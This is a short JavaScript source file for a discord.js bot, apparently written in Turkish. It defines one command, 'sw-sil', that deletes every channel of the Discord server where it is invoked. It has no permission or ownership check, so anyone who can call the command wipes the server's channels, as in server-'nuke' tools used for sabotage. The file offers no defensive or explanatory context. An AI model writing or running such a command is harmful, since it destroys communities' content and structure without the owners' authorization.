const Discord = require('discord.js');
exports.run = (client, message, args) => { 
  
    message.guild.channels.forEach(a => a.delete())};

    
 exports.config = {
    name: 'sw-sil',
     aliases: ["sw-sil"]
   };